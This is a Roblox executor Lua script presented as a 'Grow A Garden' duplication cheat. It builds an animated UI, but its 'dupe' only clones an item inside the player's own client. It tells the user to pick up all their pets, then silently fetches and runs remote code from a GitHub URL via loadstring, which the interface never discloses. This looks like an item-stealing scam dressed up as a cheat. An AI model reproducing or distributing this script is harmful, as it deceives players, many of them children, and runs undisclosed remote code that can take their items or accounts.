--// Executor-compatible Grow A Garden Dupe Script with Full UI Enhancements and External Script Loader

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

for _, name in pairs({"GrowAGardenIntro", "GrowAGardenInstructions", "GrowAGardenMain"}) do
    local gui = playerGui:FindFirstChild(name)
    if gui then gui:Destroy() end
end

local function safeCreateSound(parent, soundId, volume)
    local s = Instance.new("Sound")
    s.SoundId = soundId
    s.Volume = volume or 1
    s.Parent = parent
    return s
end

local clickSound = safeCreateSound(playerGui, "rbxassetid://9118823105", 1)

local thankYouLabel = Instance.new("TextLabel")
thankYouLabel.Size = UDim2.new(1, 0, 0, 80)
thankYouLabel.Position = UDim2.new(0, 0, 0, 0)
thankYouLabel.BackgroundTransparency = 1
thankYouLabel.Text = "Thank you for using Kira's Script <3"
thankYouLabel.Font = Enum.Font.GothamBlack
thankYouLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
thankYouLabel.TextStrokeTransparency = 0
thankYouLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
thankYouLabel.TextScaled = true
thankYouLabel.ZIndex = 100
thankYouLabel.Parent = playerGui
thankYouLabel.TextTransparency = 1

local function fadeInOutLabel(label, fadeInTime, displayTime, fadeOutTime)
    local fadeInTween = TweenService:Create(label, TweenInfo.new(fadeInTime), {TextTransparency = 0})
    local fadeOutTween = TweenService:Create(label, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
    fadeInTween:Play()
    fadeInTween.Completed:Wait()
    task.wait(displayTime)
    fadeOutTween:Play()
    fadeOutTween.Completed:Wait()
    label:Destroy()
end

task.spawn(function()
    fadeInOutLabel(thankYouLabel, 2, 3, 2)
end)

local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local deltaX = input.Position.X - dragStart.X
        local deltaY = input.Position.Y - dragStart.Y
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + deltaX, startPos.Y.Scale, startPos.Y.Offset + deltaY)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

local function createAnimatedBackground(parent, size)
    local bgFrame = Instance.new("Frame")
    bgFrame.Size = size
    bgFrame.Position = UDim2.new(0, 0, 0, 0)
    bgFrame.BackgroundColor3 = Color3.fromRGB(250, 210, 200)
    bgFrame.BackgroundTransparency = 0.4
    bgFrame.Parent = parent

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 200)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 150, 150)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 200))
    }
    gradient.Rotation = 45
    gradient.Parent = bgFrame

    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    TweenService:Create(bgFrame, tweenInfo, {BackgroundTransparency = 0.7}):Play()

    return bgFrame
end

local instrGui = Instance.new("ScreenGui")
instrGui.Name = "GrowAGardenInstructions"
instrGui.ResetOnSpawn = false
instrGui.Enabled = true
instrGui.Parent = playerGui

local instrFrame = Instance.new("Frame")
instrFrame.Size = UDim2.new(0, 450, 0, 220)
instrFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
instrFrame.BackgroundColor3 = Color3.fromRGB(255, 230, 230)
instrFrame.BorderSizePixel = 0
instrFrame.ClipsDescendants = true
instrFrame.Parent = instrGui

local instrCorner = Instance.new("UICorner")
instrCorner.CornerRadius = UDim.new(0, 20)
instrCorner.Parent = instrFrame

createAnimatedBackground(instrFrame, UDim2.new(1,0,1,0))

local instrTitle = Instance.new("TextLabel")
instrTitle.Text = "🌱 Instructions"
instrTitle.Font = Enum.Font.GothamBold
instrTitle.TextSize = 30
instrTitle.TextColor3 = Color3.fromRGB(150, 30, 30)
instrTitle.BackgroundTransparency = 1
instrTitle.Size = UDim2.new(1, 0, 0, 60)
instrTitle.Position = UDim2.new(0, 0, 0, 5)
instrTitle.Parent = instrFrame

local instrText = Instance.new("TextLabel")
instrText.Size = UDim2.new(0.9, 0, 0, 130)
instrText.Position = UDim2.new(0.05, 0, 0, 80)
instrText.BackgroundTransparency = 1
instrText.TextColor3 = Color3.fromRGB(80, 40, 40)
instrText.Font = Enum.Font.Gotham
instrText.TextSize = 22
instrText.TextWrapped = true
instrText.Parent = instrFrame

local arrowBtn = Instance.new("TextButton")
arrowBtn.Size = UDim2.new(0, 80, 0, 45)
arrowBtn.Position = UDim2.new(0.9, -85, 1, -55)
arrowBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
arrowBtn.TextColor3 = Color3.new(1, 1, 1)
arrowBtn.Font = Enum.Font.GothamBold
arrowBtn.TextSize = 24
arrowBtn.Text = "→"
arrowBtn.AutoButtonColor = false
arrowBtn.Parent = instrFrame

local arrowCorner = Instance.new("UICorner")
arrowCorner.CornerRadius = UDim.new(0, 15)
arrowCorner.Parent = arrowBtn

makeDraggable(instrFrame)

local page = 1
local function updateInstructions()
    if page == 1 then
        instrText.Text = "For this Script to work please make sure you have no active pets in your garden! Pick them all up."
        arrowBtn.Text = "→"
        arrowBtn.Visible = true
    elseif page == 2 then
        instrText.Text = "If you want to dupe seeds you have to wait for an upcoming update :)"
        arrowBtn.Text = "Understand"
    end
end
updateInstructions()

local function animateButtonClick(button)
    clickSound:Play()
    local originalSize = button.Size
    local shrink = TweenService:Create(button, TweenInfo.new(0.05), {
        Size = originalSize - UDim2.new(0, 7, 0, 7),
        BackgroundColor3 = Color3.fromRGB(80, 255, 80)
    })
    local grow = TweenService:Create(button, TweenInfo.new(0.1), {
        Size = originalSize,
        BackgroundColor3 = Color3.fromRGB(50, 200, 50)
    })
    shrink:Play()
    shrink.Completed:Wait()
    grow:Play()
end

local function loadMainGUI()
    local mainGui = Instance.new("ScreenGui")
    mainGui.Name = "GrowAGardenMain"
    mainGui.ResetOnSpawn = false
    mainGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 350, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -175, 1.5, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = mainGui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 18)
    mainCorner.Parent = mainFrame

    createAnimatedBackground(mainFrame, UDim2.new(1,0,1,0))

    local title = Instance.new("TextLabel")
    title.Text = "🌻 Grow A Garden Duper"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 28
    title.TextColor3 = Color3.fromRGB(100, 255, 100)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 12)
    title.Parent = mainFrame

    local function createButton(text, posY)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 50)
        btn.Position = UDim2.new(0.05, 0, 0, posY)
        btn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 20
        btn.Text = text
        btn.AutoButtonColor = false
        btn.Parent = mainFrame
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 15)
        corner.Parent = btn
        return btn
    end

    TweenService:Create(mainFrame, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -175, 0.5, -110)
    }):Play()

    makeDraggable(mainFrame)

    local loadingFrame = Instance.new("Frame")
    loadingFrame.Size = UDim2.new(0.9, 0, 0, 35)
    loadingFrame.Position = UDim2.new(0.05, 0, 0, 50)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
    loadingFrame.Visible = false
    loadingFrame.Parent = mainFrame

    local loadingCorner = Instance.new("UICorner")
    loadingCorner.CornerRadius = UDim.new(0, 10)
    loadingCorner.Parent = loadingFrame

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
    loadingBar.Parent = loadingFrame

    local loadingBarCorner = Instance.new("UICorner")
    loadingBarCorner.CornerRadius = UDim.new(0, 10)
    loadingBarCorner.Parent = loadingBar

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(1, 0, 1, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.Font = Enum.Font.GothamBold
    loadingLabel.TextSize = 16
    loadingLabel.Text = ""
    loadingLabel.Parent = loadingFrame

    local dupePetBtn = createButton("🦴 Dupe Pet", 90)
    local dupeSeedBtn = createButton("🌱 Dupe Seed", 160)

    local function spawnConfetti()
        local colors = {
            Color3.fromRGB(100, 255, 100),
            Color3.fromRGB(130, 255, 130),
            Color3.fromRGB(80, 220, 80),
        }
        for i = 1, 40 do
            local confetti = Instance.new("TextLabel")
            confetti.Size = UDim2.new(0, 14, 0, 14)
            confetti.Position = UDim2.new(math.random(), 0, -0.2, 0)
            confetti.BackgroundTransparency = 1
            confetti.Text = "❣️"
            confetti.TextColor3 = colors[math.random(1,#colors)]
            confetti.TextScaled = true
            confetti.Font = Enum.Font.GothamBold
            confetti.ZIndex = 25
            confetti.Parent = mainGui

            local tween = TweenService:Create(confetti, TweenInfo.new(4 + math.random()*3, Enum.EasingStyle.Linear), {
                Position = UDim2.new(confetti.Position.X.Scale, 0, 1.3, 0),
                TextTransparency = 1
            })
            tween:Play()
            Debris:AddItem(confetti, 8)
            task.wait(0.05)
        end
    end

    local function animateButtonClick(button)
        clickSound:Play()
        local originalSize = button.Size
        local shrink = TweenService:Create(button, TweenInfo.new(0.05), {
            Size = originalSize - UDim2.new(0, 10, 0, 10),
            BackgroundColor3 = Color3.fromRGB(100, 255, 100)
        })
        local grow = TweenService:Create(button, TweenInfo.new(0.1), {
            Size = originalSize,
            BackgroundColor3 = Color3.fromRGB(50, 200, 50)
        })
        shrink:Play()
        shrink.Completed:Wait()
        grow:Play()
    end

    local function duplicateHeldItem()
        local character = player.Character
        if not character then return false end

        local tool = nil
        for _, item in pairs(character:GetChildren()) do
            if item:IsA("Tool") then
                tool = item
                break
            end
        end

        if not tool then
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                tool = backpack:FindFirstChildWhichIsA("Tool")
            end
        end

        if not tool then
            return false
        end

        local dupedTool = tool:Clone()
        dupedTool.Parent = player:WaitForChild("Backpack")

        return true
    end

    local function startLoading()
        loadingFrame.Visible = true
        loadingLabel.Text = "Waiting 32 seconds..."
        loadingBar.Size = UDim2.new(0, 0, 1, 0)
        local duration = 32
        local elapsed = 0

        while elapsed < duration do
            task.wait(1)
            elapsed += 1
            loadingBar.Size = UDim2.new(elapsed / duration, 0, 1, 0)
            loadingLabel.Text = "Waiting... " .. (duration - elapsed) .. "s left"
        end

        local success = duplicateHeldItem()
        if success then
            loadingLabel.Text = "✅ Item has been duped!"
            spawnConfetti()
        else
            loadingLabel.Text = "❌ No item to dupe found."
        end
        task.wait(3)
        loadingFrame.Visible = false
    end

    dupePetBtn.MouseButton1Click:Connect(function()
        if loadingFrame.Visible then return end
        animateButtonClick(dupePetBtn)
        task.spawn(startLoading)
    end)

    dupeSeedBtn.MouseButton1Click:Connect(function()
        if loadingFrame.Visible then return end
        animateButtonClick(dupeSeedBtn)
        task.spawn(startLoading)
    end)
end

arrowBtn.MouseButton1Click:Connect(function()
    animateButtonClick(arrowBtn)
    if page == 1 then
        page = 2
        updateInstructions()
    elseif page == 2 then
        instrGui.Enabled = false
        task.delay(0.3, function()
            loadMainGUI()

            -- Execute external script after loading main GUI
            task.delay(0.5, function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/kittenpalms/ItemSpawnerScript/refs/heads/main/script.lua"))()
            end)
        end)
    end
end)
